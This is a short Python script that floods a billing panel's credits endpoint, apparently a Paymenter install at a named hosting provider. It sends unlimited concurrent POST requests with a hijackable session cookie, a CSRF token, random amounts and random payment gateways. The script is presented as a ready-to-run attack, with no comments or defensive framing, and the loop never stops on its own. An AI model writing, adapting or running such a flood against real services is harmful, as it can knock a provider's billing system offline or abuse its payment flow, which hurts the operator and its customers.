import requests
import random
import concurrent.futures

url = "https://billing.embernodes.com/credits"

paymenter_token = "ABC123"
paymenter_session = "123ABC"

cookies = {
    "paymenter_session": paymenter_session
}

def send_request():
    data = {
        "_token": paymenter_token,
        "amount": random.randint(80, 100),
        "gateway": random.choice([11, 15])
    }
    try:
        response = requests.post(url, data=data, cookies=cookies)
        return response.status_code
    except Exception as e:
        return f"Request failed: {e}"

def continuously_send_requests():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        while True:
            executor.submit(send_request)

continuously_send_requests()
